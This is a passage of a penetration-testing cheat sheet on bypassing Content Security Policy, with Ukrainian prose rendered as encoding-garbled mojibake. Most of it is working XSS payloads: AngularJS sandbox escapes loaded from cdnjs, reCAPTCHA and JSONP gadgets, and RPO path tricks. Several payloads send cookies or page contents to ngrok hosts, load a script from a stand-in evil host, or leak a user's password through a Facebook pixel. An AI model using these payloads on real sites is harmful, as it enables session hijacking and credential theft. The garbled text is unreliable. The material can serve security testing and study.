–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª JS, –≤–∏ –º–æ–∂–µ—Ç–µ –æ–±—ñ–π—Ç–∏ —Ü–µ–π CSP:

–†–æ–±–æ—á–∏–π –≤–∞–Ω—Ç–∞–∂:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
–û–¥–Ω–∞–∫, –π–º–æ–≤—ñ—Ä–Ω–æ, —â–æ —Å–µ—Ä–≤–µ—Ä **–ø–µ—Ä–µ–≤—ñ—Ä—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π —Ñ–∞–π–ª** —ñ –¥–æ–∑–≤–æ–ª–∏—Ç—å –≤–∞–º **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –ª–∏—à–µ –ø–µ–≤–Ω—ñ —Ç–∏–ø–∏ —Ñ–∞–π–ª—ñ–≤**.

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ **JS –∫–æ–¥ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ** —Ñ–∞–π–ª—É –∑ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º, –ø—Ä–∏–π–Ω—è—Ç–∏–º —Å–µ—Ä–≤–µ—Ä–æ–º (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥: _script.png_), —Ü—å–æ–≥–æ –±—É–¥–µ –Ω–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ, –æ—Å–∫—ñ–ª—å–∫–∏ –¥–µ—è–∫—ñ —Å–µ—Ä–≤–µ—Ä–∏, —Ç–∞–∫—ñ —è–∫ apache server, **–≤–∏–±–∏—Ä–∞—é—Ç—å MIME —Ç–∏–ø —Ñ–∞–π–ª—É –Ω–∞ –æ—Å–Ω–æ–≤—ñ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è**, –∞ –±—Ä–∞—É–∑–µ—Ä–∏, —Ç–∞–∫—ñ —è–∫ Chrome, **–≤—ñ–¥–º–æ–≤–ª—è—Ç—å—Å—è –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ Javascript** –∫–æ–¥ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —á–æ–≥–æ—Å—å, —â–æ –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è–º. "–°–ø–æ–¥—ñ–≤–∞—î–º–æ—Å—å", —î –ø–æ–º–∏–ª–∫–∏. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∑ CTF —è –¥—ñ–∑–Ω–∞–≤—Å—è, —â–æ **Apache –Ω–µ –∑–Ω–∞—î** –ø—Ä–æ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è _**.wave**_, —Ç–æ–º—É –Ω–µ –ø–æ–¥–∞—î –π–æ–≥–æ –∑ **MIME —Ç–∏–ø–æ–º, —è–∫ audio/\***.

–ó–≤—ñ–¥—Å–∏, —è–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ XSS —ñ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤, —ñ –≤–∞–º –≤–¥–∞—Å—Ç—å—Å—è –∑–Ω–∞–π—Ç–∏ **–Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–æ–≤–∞–Ω–µ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è**, –≤–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª –∑ —Ü–∏–º —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º —ñ –≤–º—ñ—Å—Ç–æ–º —Å–∫—Ä–∏–ø—Ç–∞. –ê–±–æ, —è–∫—â–æ —Å–µ—Ä–≤–µ—Ä –ø–µ—Ä–µ–≤—ñ—Ä—è—î –ø—Ä–∞–≤–∏–ª—å–Ω–∏–π —Ñ–æ—Ä–º–∞—Ç –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ–≥–æ —Ñ–∞–π–ª—É, —Å—Ç–≤–æ—Ä—ñ—Ç—å –ø–æ–ª—ñ–≥–ª–æ—Ç ([–¥–µ—è–∫—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ –ø–æ–ª—ñ–≥–ª–æ—Ç—ñ–≤ —Ç—É—Ç](https://github.com/Polydet/polyglot-database)).

### Form-action

–Ø–∫—â–æ –Ω–µ–º–æ–∂–ª–∏–≤–æ –≤–ø—Ä–æ–≤–∞–¥–∏—Ç–∏ JS, –≤–∏ –≤—Å–µ —â–µ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, **–≤–ø—Ä–æ–≤–∞–¥–∂—É—é—á–∏ –¥—ñ—é —Ñ–æ—Ä–º–∏** (—ñ, –º–æ–∂–ª–∏–≤–æ, –æ—á—ñ–∫—É—é—á–∏, —â–æ –º–µ–Ω–µ–¥–∂–µ—Ä–∏ –ø–∞—Ä–æ–ª—ñ–≤ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –∑–∞–ø–æ–≤–Ω—è—Ç—å –ø–∞—Ä–æ–ª—ñ). –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ [**–ø—Ä–∏–∫–ª–∞–¥ —É —Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). –¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ `default-src` –Ω–µ –æ—Ö–æ–ø–ª—é—î –¥—ñ—ó —Ñ–æ—Ä–º.

### Third Party Endpoints + ('unsafe-eval')

{% hint style="warning" %}
–î–ª—è –¥–µ—è–∫–∏—Ö –∑ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö payload **`unsafe-eval` –Ω–∞–≤—ñ—Ç—å –Ω–µ –ø–æ—Ç—Ä—ñ–±–µ–Ω**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –≤—Ä–∞–∑–ª–∏–≤—É –≤–µ—Ä—Å—ñ—é angular —Ç–∞ –≤–∏–∫–æ–Ω–∞–π—Ç–µ –¥–æ–≤—ñ–ª—å–Ω–∏–π JS:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads using Angular + a library with functions that return the `window` object ([check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
–£ –ø–æ—Å—Ç—ñ –ø–æ–∫–∞–∑–∞–Ω–æ, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏** –≤—Å—ñ **–±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏** –∑ `cdn.cloudflare.com` (–∞–±–æ –±—É–¥—å-—è–∫–æ–≥–æ —ñ–Ω—à–æ–≥–æ –¥–æ–∑–≤–æ–ª–µ–Ω–æ–≥–æ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é JS –±—ñ–±–ª—ñ–æ—Ç–µ–∫), –≤–∏–∫–æ–Ω–∞—Ç–∏ –≤—Å—ñ –¥–æ–¥–∞–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –∑ –∫–æ–∂–Ω–æ—ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ **—è–∫—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –∑ —è–∫–∏—Ö –±—ñ–±–ª—ñ–æ—Ç–µ–∫ –ø–æ–≤–µ—Ä—Ç–∞—é—Ç—å –æ–±'—î–∫—Ç `window`**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS –∑ —ñ–º–µ–Ω—ñ –∫–ª–∞—Å—É:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è JS-–∫–æ–¥–æ–º google recaptcha

–ó–≥—ñ–¥–Ω–æ –∑ [**—Ü—ñ—î—é CTF-—Å—Ç–∞—Ç—Ç–µ—é**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves), –≤–∏ –º–æ–∂–µ—Ç–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ CSP –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ JS-–∫–æ–¥—É, –æ–±—Ö–æ–¥—è—á–∏ CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
–ë—ñ–ª—å—à–µ [**–ø–µ–π–ª–æ–∞–¥—ñ–≤ –∑ —Ü—å–æ–≥–æ –æ–ø–∏—Å—É**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
#### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è www.google.com –¥–ª—è –≤—ñ–¥–∫—Ä–∏—Ç–æ–≥–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è

–ù–∞—Å—Ç—É–ø–Ω–µ URL –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î –Ω–∞ example.com (–∑ [—Ç—É—Ç](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
–ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è \*.google.com/script.google.com

–ú–æ–∂–ª–∏–≤–æ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ Google Apps Script, —â–æ–± –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ script.google.com. –Ø–∫ —Ü–µ [–∑—Ä–æ–±–ª–µ–Ω–æ –≤ —Ü—å–æ–º—É –∑–≤—ñ—Ç—ñ](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### –¢—Ä–µ—Ç—ñ —Å—Ç–æ—Ä–æ–Ω–∏ + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
–°—Ü–µ–Ω–∞—Ä—ñ—ó, –ø–æ–¥—ñ–±–Ω—ñ –¥–æ —Ü—å–æ–≥–æ, –¥–µ `script-src` –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ `self` —Ç–∞ –ø–µ–≤–Ω–∏–π –¥–æ–º–µ–Ω, —è–∫–∏–π —î —É –±—ñ–ª–æ–º—É —Å–ø–∏—Å–∫—É, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –æ–±—ñ–π–¥–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é JSONP. JSONP –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –Ω–µ–±–µ–∑–ø–µ—á–Ω—ñ –º–µ—Ç–æ–¥–∏ –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ –≤–∏–∫–ª–∏–∫—É, —è–∫—ñ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –≤–∏–∫–æ–Ω–∞—Ç–∏ XSS, —Ä–æ–±–æ—á–∏–π –≤–∞–Ω—Ç–∞–∂:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **–º—ñ—Å—Ç–∏—Ç—å –≥–æ—Ç–æ–≤—ñ –¥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è JSONP –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏ –¥–ª—è –æ–±—Ö–æ–¥—É CSP —Ä—ñ–∑–Ω–∏—Ö –≤–µ–±-—Å–∞–π—Ç—ñ–≤.**

–¢–∞ —Å–∞–º–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–∏–Ω–∏–∫–Ω–µ, —è–∫—â–æ **–¥–æ—Å—Ç–æ–≤—ñ—Ä–Ω–∞ –∫—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞ –º—ñ—Å—Ç–∏—Ç—å –≤—ñ–¥–∫—Ä–∏—Ç–∏–π —Ä–µ–¥–∏—Ä–µ–∫—Ç**, –æ—Å–∫—ñ–ª—å–∫–∏ —è–∫—â–æ –ø–æ—á–∞—Ç–∫–æ–≤–∞ –∫—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞ —î –Ω–∞–¥—ñ–π–Ω–æ—é, —Ä–µ–¥–∏—Ä–µ–∫—Ç–∏ —Ç–∞–∫–æ–∂ –≤–≤–∞–∂–∞—é—Ç—å—Å—è –Ω–∞–¥—ñ–π–Ω–∏–º–∏.

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –∑ –±–æ–∫—É —Ç—Ä–µ—Ç—ñ—Ö –æ—Å—ñ–±

–Ø–∫ –æ–ø–∏—Å–∞–Ω–æ –≤ [–Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –ø–æ—Å—Ç—ñ](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), —ñ—Å–Ω—É—î –±–∞–≥–∞—Ç–æ –¥–æ–º–µ–Ω—ñ–≤ —Ç—Ä–µ—Ç—ñ—Ö –æ—Å—ñ–±, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –¥–æ–∑–≤–æ–ª–µ–Ω—ñ –¥–µ—Å—å —É CSP, —ñ —ó—Ö –º–æ–∂–Ω–∞ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –¥–ª—è –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –¥–∞–Ω–∏—Ö –∞–±–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è JavaScript –∫–æ–¥—É. –î–µ—è–∫—ñ –∑ —Ü–∏—Ö —Ç—Ä–µ—Ç—ñ—Ö –æ—Å—ñ–±:

| –°—É–±'—î–∫—Ç           | –î–æ–∑–≤–æ–ª–µ–Ω–∏–π –¥–æ–º–µ–Ω                            | –ú–æ–∂–ª–∏–≤–æ—Å—Ç—ñ   |
| ----------------- | ------------------------------------------- | ------------ |
| Facebook          | www.facebook.com, \*.facebook.com           | Exfil        |
| Hotjar            | \*.hotjar.com, ask.hotjar.io               | Exfil        |
| Jsdelivr          | \*.jsdelivr.com, cdn.jsdelivr.net           | Exec         |
| Amazon CloudFront | \*.cloudfront.net                           | Exfil, Exec  |
| Amazon AWS        | \*.amazonaws.com                            | Exfil, Exec  |
| Azure Websites    | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec  |
| Salesforce Heroku | \*.herokuapp.com                            | Exfil, Exec  |
| Google Firebase   | \*.firebaseapp.com                          | Exfil, Exec  |

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –±—É–¥—å-—è–∫–∏–π –∑ –¥–æ–∑–≤–æ–ª–µ–Ω–∏—Ö –¥–æ–º–µ–Ω—ñ–≤ —É CSP –≤–∞—à–æ—ó —Ü—ñ–ª—ñ, —î –π–º–æ–≤—ñ—Ä–Ω—ñ—Å—Ç—å, —â–æ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –æ–±—ñ–π—Ç–∏ CSP, –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞–≤—à–∏—Å—å –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–Ω—å–æ–º—É —Å–µ—Ä–≤—ñ—Å—ñ —Ç–∞ –∞–±–æ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ –Ω–∞ —Ü–µ–π —Å–µ—Ä–≤—ñ—Å, –∞–±–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π CSP:
```
Content-Security-Policy‚Äã: default-src 'self‚Äô www.facebook.com;‚Äã
```
–∞–±–æ
```
Content-Security-Policy‚Äã: connect-src www.facebook.com;‚Äã
```
–í–∏ –ø–æ–≤–∏–Ω–Ω—ñ –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ, —Ç–∞–∫ —Å–∞–º–æ —è–∫ —Ü–µ –∑–∞–≤–∂–¥–∏ —Ä–æ–±–∏–ª–æ—Å—è –∑ [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –≤–∏ –¥–æ—Ç—Ä–∏–º—É—î—Ç–µ—Å—è —Ü–∏—Ö –∑–∞–≥–∞–ª—å–Ω–∏—Ö –∫—Ä–æ–∫—ñ–≤:

1. –°—Ç–≤–æ—Ä—ñ—Ç—å –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Ä–æ–∑—Ä–æ–±–Ω–∏–∫–∞ Facebook —Ç—É—Ç.
2. –°—Ç–≤–æ—Ä—ñ—Ç—å –Ω–æ–≤–∏–π –¥–æ–¥–∞—Ç–æ–∫ "Facebook Login" —ñ –≤–∏–±–µ—Ä—ñ—Ç—å "–í–µ–±-—Å–∞–π—Ç".
3. –ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ "–ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è -> –û—Å–Ω–æ–≤–Ω—ñ" —ñ –æ—Ç—Ä–∏–º–∞–π—Ç–µ —Å–≤—ñ–π "ID –¥–æ–¥–∞—Ç–∫–∞".
4. –ù–∞ —Ü—ñ–ª—å–æ–≤–æ–º—É —Å–∞–π—Ç—ñ, –∑ —è–∫–æ–≥–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ, –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –≥–∞–¥–∂–µ—Ç Facebook SDK "fbq" —á–µ—Ä–µ–∑ "customEvent" —ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö.
5. –ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ "–ú–µ–Ω–µ–¥–∂–µ—Ä–∞ –ø–æ–¥—ñ–π" –≤–∞—à–æ–≥–æ –¥–æ–¥–∞—Ç–∫–∞ —ñ –≤–∏–±–µ—Ä—ñ—Ç—å —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –≤–∞–º–∏ –¥–æ–¥–∞—Ç–æ–∫ (–∑–∞—É–≤–∞–∂—Ç–µ, —â–æ –º–µ–Ω–µ–¥–∂–µ—Ä –ø–æ–¥—ñ–π –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –∑–∞ URL, –ø–æ–¥—ñ–±–Ω–∏–º –¥–æ —Ü—å–æ–≥–æ: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events).
6. –í–∏–±–µ—Ä—ñ—Ç—å –≤–∫–ª–∞–¥–∫—É "–¢–µ—Å—Ç–æ–≤—ñ –ø–æ–¥—ñ—ó", —â–æ–± –ø–æ–±–∞—á–∏—Ç–∏ –ø–æ–¥—ñ—ó, —è–∫—ñ –Ω–∞–¥—Å–∏–ª–∞—é—Ç—å—Å—è –∑ "–≤–∞—à–æ–≥–æ" –≤–µ–±-—Å–∞–π—Ç—É.

–ü–æ—Ç—ñ–º, –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ –∂–µ—Ä—Ç–≤–∏, –≤–∏ –≤–∏–∫–æ–Ω—É—î—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∫–æ–¥, —â–æ–± —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –ø—ñ–∫—Å–µ–ª—å –≤—ñ–¥—Å—Ç–µ–∂–µ–Ω–Ω—è Facebook, –≤–∫–∞–∑—É—é—á–∏ –Ω–∞ ID –¥–æ–¥–∞—Ç–∫–∞ —Ä–æ–∑—Ä–æ–±–Ω–∏–∫–∞ Facebook –∞—Ç–∞–∫—É—é—á–æ–≥–æ —Ç–∞ –≤–∏–¥–∞—é—á–∏ –ø–æ–¥—ñ—é –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫ —Ü—è:
```JavaScript
fbq('init', '1279785999289471');‚Äã // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{‚Äã
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"‚Äã
});
```
–©–æ–¥–æ —ñ–Ω—à–∏—Ö —Å–µ–º–∏ –¥–æ–º–µ–Ω—ñ–≤ —Ç—Ä–µ—Ç—å–æ—ó —Å—Ç–æ—Ä–æ–Ω–∏, –∑–∞–∑–Ω–∞—á–µ–Ω–∏—Ö —É –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —Ç–∞–±–ª–∏—Ü—ñ, —ñ—Å–Ω—É—î –±–∞–≥–∞—Ç–æ —ñ–Ω—à–∏—Ö —Å–ø–æ—Å–æ–±—ñ–≤ —ó—Ö –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è. –ó–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –¥–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ [–±–ª–æ–≥ –ø–æ—Å—Ç—É](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) –¥–ª—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –ø–æ—è—Å–Ω–µ–Ω—å –ø—Ä–æ —ñ–Ω—à—ñ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ç—Ä–µ—Ç—å–æ—é —Å—Ç–æ—Ä–æ–Ω–æ—é.

### Bypass via RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

–ù–∞ –¥–æ–¥–∞—Ç–æ–∫ –¥–æ –∑–≥–∞–¥—É–≤–∞–Ω–æ–≥–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –¥–ª—è –æ–±—Ö–æ–¥—É –æ–±–º–µ–∂–µ–Ω—å —à–ª—è—Ö—É, —ñ—Å–Ω—É—î —â–µ –æ–¥–Ω–∞ —Ç–µ—Ö–Ω—ñ–∫–∞, –∑–≤–∞–Ω–æ—é Relative Path Overwrite (RPO), —è–∫–∞ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –Ω–∞ –¥–µ—è–∫–∏—Ö —Å–µ—Ä–≤–µ—Ä–∞—Ö.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ CSP –¥–æ–∑–≤–æ–ª—è—î —à–ª—è—Ö `https://example.com/scripts/react/`, –π–æ–≥–æ –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
–ë—Ä–∞—É–∑–µ—Ä –≤ –∫—ñ–Ω—Ü–µ–≤–æ–º—É –ø—ñ–¥—Å—É–º–∫—É –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å `https://example.com/scripts/angular/angular.js`.

–¶–µ –ø—Ä–∞—Ü—é—î, —Ç–æ–º—É —â–æ –¥–ª—è –±—Ä–∞—É–∑–µ—Ä–∞ –≤–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç–µ —Ñ–∞–π–ª –∑ –Ω–∞–∑–≤–æ—é `..%2fangular%2fangular.js`, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π –∑–∞ –∞–¥—Ä–µ—Å–æ—é `https://example.com/scripts/react/`, —â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î CSP.

‚àë, –≤–æ–Ω–∏ –¥–µ–∫–æ–¥—É—é—Ç—å –π–æ–≥–æ, —Ñ–∞–∫—Ç–∏—á–Ω–æ –∑–∞–ø–∏—Ç—É—é—á–∏ `https://example.com/scripts/react/../angular/angular.js`, —â–æ –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω–æ `https://example.com/scripts/angular/angular.js`.

